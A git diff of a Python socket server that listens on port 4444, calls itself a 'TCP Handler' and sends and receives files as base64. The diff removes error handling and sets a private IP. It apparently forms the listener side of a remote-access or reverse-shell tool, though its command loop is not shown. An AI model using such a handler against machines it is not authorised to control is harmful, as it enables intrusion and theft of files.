@@ -1,21 +1,18 @@
 import socket
 import json
 import base64
-import os
-from colorama import Fore, Style, init  # Initialize colorama
+from colorama import Fore, Style, init
 
+# Initialize colorama
 init(autoreset=True)
 
 # Server configuration
-HOST = "0.0.0.0"  # Replace with your server's IP address
+HOST = "10.0.1.37"  # Replace with your server's IP address
 PORT = 4444  # Replace with your desired port
 
 def send_json(conn, data):
-    try:
-        json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
-        conn.send(json_data.encode())  # Encode to bytes before sending
-    except Exception as e:
-        print(f"[!] Error sending data: {e}")
+    json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
+    conn.send(json_data.encode())  # Encode to bytes before sending
 
 def recieve_json(conn):
     json_data = ""
@@ -25,38 +22,23 @@ def recieve_json(conn):
             return json.loads(json_data)  # Return the full file till the end of the string/data
         except ValueError:
             continue
-        except Exception as e:
-            print(f"[!] Error receiving data: {e}")
-            break
 
 def write_file(path, content):
-    try:
-        with open(path, "wb") as file:  # Write binary file
-            file.write(base64.b64decode(content))
-            return "[+] Download successful [+]"
-    except Exception as e:
-        return f"[!] Error writing to file {path}: {e}"
+    with open(path, "wb") as file:  # Write binary file
+        file.write(base64.b64decode(content))
+        return "[+] Download successful [+]"
 
 def read_file(path):
-    try:
-        if not os.path.exists(path):
-            return "[!] Error: File does not exist."
-        with open(path, "rb") as file:  # Read binary file
-            return base64.b64encode(file.read()).decode()  # Decode bytes to string
-    except Exception as e:
-        return f"[!] Error reading file {path}: {e}"
+    with open(path, "rb") as file:  # Read binary file
+        return base64.b64encode(file.read()).decode()  # Decode bytes to string
 
 # Print starting message
 print(Fore.GREEN + "Starting TCP Handler...")
 
 # Set up the server
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-try:
-    server.bind((HOST, PORT))
-    server.listen(5)
-except socket.error as e:
-    print(f"[!] Error: Could not bind to {HOST}:{PORT}: {e}")
-    server.close()
+server.bind((HOST, PORT))
+server.listen(5)
 
 # Wait for a connection
 print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
@@ -96,9 +78,5 @@ try:
 
 except KeyboardInterrupt:
     print(Fore.RED + "\nShutting down the server.")
-    client_socket.close()
-    server.close()
-except Exception as e:
-    print(Fore.RED + f"[!] Error: {e}")
     client_socket.close()
     server.close()
